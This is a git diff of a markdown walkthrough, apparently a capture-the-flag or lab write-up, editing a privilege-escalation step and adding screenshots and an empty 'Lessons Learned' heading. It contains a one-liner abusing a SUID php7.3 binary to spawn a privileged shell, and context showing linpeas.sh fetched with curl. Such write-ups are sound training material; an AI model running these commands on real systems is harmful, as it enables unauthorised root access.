@@ -165,9 +165,21 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 <img width="949" height="301" alt="image" src="https://github.com/user-attachments/assets/abdacf3c-a920-4f13-b3fa-44b065d28b27" />
 
 ```bash
-usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+/usr/bin/php7.3 -r "pcntl_exec('/bin/sh',['-p']);"
 ```
 
+
+<img width="753" height="240" alt="image" src="https://github.com/user-attachments/assets/215c018b-bf4e-4eb5-b60a-eb934017cc01" />
+<img width="1098" height="282" alt="image" src="https://github.com/user-attachments/assets/6a6cedf0-61ed-4021-a433-11337ea62c05" />
+
+----
+
+## Lessons Learned
+
+
+
+
+---
 
 
 
